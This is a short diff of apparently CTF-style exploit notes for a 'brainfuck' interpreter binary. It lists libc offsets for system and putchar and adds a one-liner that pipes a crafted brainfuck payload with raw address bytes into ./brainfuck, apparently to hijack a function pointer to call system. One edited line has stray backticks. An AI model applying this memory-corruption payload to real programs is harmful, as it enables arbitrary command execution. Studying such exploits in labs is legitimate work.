@@ -9,7 +9,7 @@ file libc -> x/i system
 libc.so:    putchar     @ 0x61930               -> linked at 0xf7df2060
             system      @ 0x3adb0 (-0x26b80)    -> linked at 0x
             fwprintf    @ 0x61ab0 (+0x180)      -> linked at 0xf7df21d0 (+0x170)
-            putwchar    @ 0x617b0 (-0x180)      -> linked at 0xf7df1ef0 (-0x170)
+            putwchar    @ 0x617b0 (-0x180)      -> linked a``t 0xf7df1ef0 (-0x170)
             ungetwc     @ 0x61580 (-0x3b0)      -> linked at 0xf7df1ce0 (-0x380)
             
             do_system                           -> linked at 0xf7dc4cb0
@@ -24,6 +24,7 @@ deploy
 .
 
 run <<< $(echo -n -e "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,>,>,.\n\x70\x51\xdc\xf7\n")
+echo -n -e "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,>,>,.\n\x70\x51\xdc\xf7\n" | ./brainfuck
 
 -------------------------------------------------------------------------------------------------------------
 failed attempt to hack the dynamic linker with a custom Elf32_Rel entry invoking lookup of the "system" symbol:
